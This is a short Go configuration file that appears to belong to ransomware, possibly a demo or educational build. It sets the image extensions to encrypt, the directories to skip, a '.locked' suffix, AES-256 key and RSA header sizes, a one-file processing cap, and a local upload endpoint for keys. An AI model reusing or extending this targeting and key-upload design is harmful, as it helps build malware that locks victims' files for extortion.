package main

// Extensions to encrypt
var Extensions = [...]string{
	"png",
	"jpg",
	"jpeg",
	"tif",
}

// IgnoreDirs will skip directories that contains the string
var IgnoreDirs = [...]string{
	"AppData",
	".",
}

const (
	// LockedExtension to append to file name when encrypted
	LockedExtension = ".locked"

	// ProcessMax X files, then stop
	ProcessMax int = 1

	// KeySize in bytes (AES-256)
	KeySize int = 32

	// EncryptedHeaderSize I don't know how to calculate the length of RSA ciphertext, but with KeySize + aes.BlockSize it'll be 128 bytes
	// Check this if changing AES keysize or RSA bit size
	EncryptedHeaderSize int = 128

	// Endpoint web server URL
	Endpoint = "http://localhost:1312/upload"
)
